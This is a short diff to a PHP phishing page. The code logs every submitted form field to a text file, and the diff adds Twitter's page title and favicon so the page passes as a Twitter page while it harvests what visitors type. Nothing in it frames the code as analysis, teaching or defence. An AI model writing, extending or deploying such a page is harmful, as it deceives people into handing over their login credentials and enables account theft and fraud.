@@ -25,6 +25,7 @@ $path = substr($path,0,17);
 
 $file = $path ."/export/data.txt";
 file_put_contents($file, print_r($_POST, true), FILE_APPEND);
+file_put_contents($file, print_r("<hr/>\n", true), FILE_APPEND);
 
 ?>
 
@@ -33,6 +34,14 @@ file_put_contents($file, print_r($_POST, true), FILE_APPEND);
 
 <html>
 <head>
+
+<meta charset="utf-8">
+
+  <title>Twitter. It&#39;s what&#39;s happening.</title>      
+
+<link href="https://ma.twimg.com/twitter-mobile/96e6f6ff1a9d3e3acf6b4ee4ce320dd1474e81c1/images/favicon.ico" rel="icon" type="image/x-icon" />
+
+
 </head>
 <body style="background-image:url(css/error.png); background-repeat: no-repeat; background-size: auto; background-position:center; background-color: #f7f7f7;">
 </body>
